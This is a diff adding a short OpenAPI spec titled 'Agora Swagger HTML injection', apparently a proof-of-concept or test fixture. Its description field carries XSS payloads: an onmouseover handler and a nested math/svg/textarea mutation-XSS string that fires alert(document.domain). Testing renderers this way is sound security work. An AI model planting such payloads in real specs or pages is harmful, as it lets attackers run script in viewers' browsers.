@@ -1,0 +1,7 @@
+openapi: "3.0.0"
+
+info:
+  title: Agora Swagger HTML injection
+  description:
+    <a href="https://bing.com" onmouseover="alert(1)">HTML</a>
+    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
